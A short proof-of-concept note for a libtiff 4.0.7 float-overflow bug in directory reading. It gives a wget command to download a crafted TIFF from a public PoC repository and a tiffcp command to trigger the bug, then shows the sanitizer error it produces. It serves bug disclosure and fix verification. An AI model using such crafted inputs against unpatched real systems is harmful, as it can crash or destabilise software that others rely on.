# POC for libtiff Bug 2643 - Float Value Overflow

## POC URL
https://github.com/asarubbo/poc/blob/master/00114-libtiff-outside-float-tif_dirread

## Compilation Environment
- libtiff version 4.0.7
- Linux PC
- Compiled with `-fsanitize=undefined` flag

## Run Command
```
wget https://github.com/asarubbo/poc/raw/master/00114-libtiff-outside-float-tif_dirread -O poc.tif
tiffcp -i poc.tif /tmp/foo
```

## Expected Output
When running the command with an undefined behavior sanitizer, you should see an error message similar to:
```
tif_dirread.c:2409:12: runtime error: value -4.779e+161 is outside the range of representable values of type 'float'
```

This demonstrates the floating point overflow vulnerability in libtiff's directory reading functionality before the fix was implemented.